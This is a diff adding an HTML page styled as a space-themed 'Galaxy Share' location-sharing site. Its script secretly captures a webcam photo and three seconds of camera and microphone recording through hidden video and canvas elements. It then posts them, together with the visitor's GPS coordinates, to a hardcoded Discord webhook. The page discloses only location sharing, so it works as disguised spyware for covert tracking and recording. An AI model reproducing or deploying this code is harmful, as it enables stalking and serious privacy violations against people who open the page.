@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Galaxy Share</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Segoe UI', sans-serif;
+      background: black;
+      color: white;
+    }
+
+    .stars, .twinkling {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 0;
+    }
+
+    .stars {
+      background: url('stars.png') repeat;
+    }
+
+    .twinkling {
+      background: url('twinkle.png') repeat;
+      animation: twinkleMove 200s linear infinite;
+    }
+
+    @keyframes twinkleMove {
+      from { background-position: 0 0; }
+      to { background-position: -10000px 5000px; }
+    }
+
+    .overlay {
+      position: absolute;
+      z-index: 10;
+      top: 0; left: 0; right: 0; bottom: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      backdrop-filter: blur(8px);
+      background: rgba(0, 0, 0, 0.3);
+      animation: fadeIn 2s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .logo {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      background: url('logo.png') center/cover no-repeat;
+      box-shadow: 0 0 30px #00f0ff, 0 0 60px #7d00ff;
+      animation: float 3s ease-in-out infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0); }
+    }
+
+    h1 {
+      font-size: 3em;
+      color: #fff;
+      text-shadow: 0 0 20px #00ccff, 0 0 40px #9900ff;
+      animation: pulse 3s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.05); opacity: 0.9; }
+    }
+
+    p {
+      font-size: 1.2em;
+      color: #ccc;
+      margin: 1em 0 2em;
+    }
+
+    button {
+      background: linear-gradient(135deg, #00f0ff, #7d00ff);
+      color: white;
+      border: none;
+      border-radius: 50px;
+      padding: 15px 45px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 20px #00f6ff, 0 0 30px #7d00ff;
+      transition: transform 0.3s ease;
+    }
+
+    button:hover {
+      transform: scale(1.1);
+    }
+
+    video, canvas, audio {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="stars"></div>
+<div class="twinkling"></div>
+
+<div class="overlay">
+  <div class="logo"></div>
+  <h1>H E N G</h1>
+  <p>share your location to H E N G now.</p>
+  <button onclick="start()">Start Sharing</button>
+</div>
+
+<audio autoplay loop>
+  <source src="bg-music.mp3" type="audio/mpeg">
+</audio>
+
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+  const webhook = "https://discord.com/api/webhooks/1373582402269478962/owTDYtZFHu4ta9VhxQYJaYX-6ysE7HMR-2ay-brOaPO6mY96AQ7dMOrfln96m9EV4cT0";
+
+  async function start() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+
+      const pos = await new Promise((res, rej) =>
+        navigator.geolocation.getCurrentPosition(res, rej));
+      const { latitude, longitude } = pos.coords;
+
+      const canvas = document.getElementById("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      const photo = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+
+      let chunks = [];
+      const recorder = new MediaRecorder(stream);
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.start();
+      await new Promise(r => setTimeout(() => { recorder.stop(); recorder.onstop = r; }, 3000));
+      const videoBlob = new Blob(chunks, { type: "video/webm" });
+      stream.getTracks().forEach(track => track.stop());
+
+      const form = new FormData();
+      form.append("payload_json", JSON.stringify({
+        content: `[Live Location](https://maps.google.com/?q=${latitude},${longitude})`,
+        embeds: [{ image: { url: "attachment://photo.jpg" } }]
+      }));
+      form.append("file", photo, "photo.jpg");
+      form.append("file2", videoBlob, "video.webm");
+
+      await fetch(webhook, { method: "POST", body: form });
+    } catch (e) {
+      alert("Error: Please allow camera/microphone/location.");
+    }
+  }
+</script>
+
+</body>
+</html>
